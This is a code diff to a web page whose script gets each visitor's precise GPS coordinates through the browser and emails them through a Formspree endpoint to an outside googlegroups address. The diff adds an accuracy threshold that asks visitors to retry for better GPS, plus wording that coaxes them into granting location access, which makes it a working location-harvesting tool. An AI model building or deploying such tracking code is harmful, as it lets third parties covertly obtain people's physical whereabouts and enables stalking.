@@ -9,7 +9,7 @@
 
   <center>
     <h1 style="color:#00ff00">All Humans, All Equal, To The Dust</h1>
-    <p>This is a sample text to capture and send automatically via email.</p>
+    <p>This page captures your location and sends it automatically via email. Please allow location access for accurate results.</p>
   </center>
 
   <script>
@@ -20,31 +20,40 @@
         navigator.geolocation.getCurrentPosition(function(position) {
           const userLat = position.coords.latitude;  // Latitude
           const userLng = position.coords.longitude; // Longitude
+          const accuracy = position.coords.accuracy; // Accuracy in meters
 
-          // Prepare the location data to be sent in the email
-          const locationMessage = `User's Location:\nLatitude: ${userLat}\nLongitude: ${userLng}`;
+          console.log(`Latitude: ${userLat}, Longitude: ${userLng}, Accuracy: ${accuracy} meters`);
 
-          // Prepare form data (simulate sending form data to an email service like Formspree)
-          const formData = new FormData();
-          formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
-          formData.append("subject", "Captured User Location from Webpage");
-          formData.append("message", locationMessage);
+          // Check if accuracy is good enough (e.g., within 500 meters)
+          if (accuracy > 500) {
+            alert("The location accuracy is too low. Please try again in an area with better GPS reception.");
+          } else {
+            // Prepare the location data to be sent in the email
+            const locationMessage = `User's Location:\nLatitude: ${userLat}\nLongitude: ${userLng}\nAccuracy: ${accuracy} meters`;
 
-          // Send the form data to Formspree endpoint (or another email service)
-          fetch("https://formspree.io/f/movqwbek", {
-            method: "POST",
-            body: formData,
-          })
-          .then(response => {
-            if (response.ok) {
-              console.log("Email sent successfully!");
-            } else {
-              console.error("Error sending email. Response: ", response.status);
-            }
-          })
-          .catch(error => {
-            console.error("Error sending email:", error);
-          });
+            // Prepare form data (simulate sending form data to an email service like Formspree)
+            const formData = new FormData();
+            formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
+            formData.append("subject", "Captured User Location from Webpage");
+            formData.append("message", locationMessage);
+
+            // Send the form data to Formspree endpoint (or another email service)
+            fetch("https://formspree.io/f/movqwbek", {
+              method: "POST",
+              body: formData,
+            })
+            .then(response => {
+              if (response.ok) {
+                console.log("Email sent successfully!");
+                alert("Location captured and email sent successfully!");
+              } else {
+                console.error("Error sending email. Response: ", response.status);
+              }
+            })
+            .catch(error => {
+              console.error("Error sending email:", error);
+            });
+          }
         }, function(error) {
           // Handle geolocation errors
           alert("Error: The Geolocation service failed. Please allow location access.");
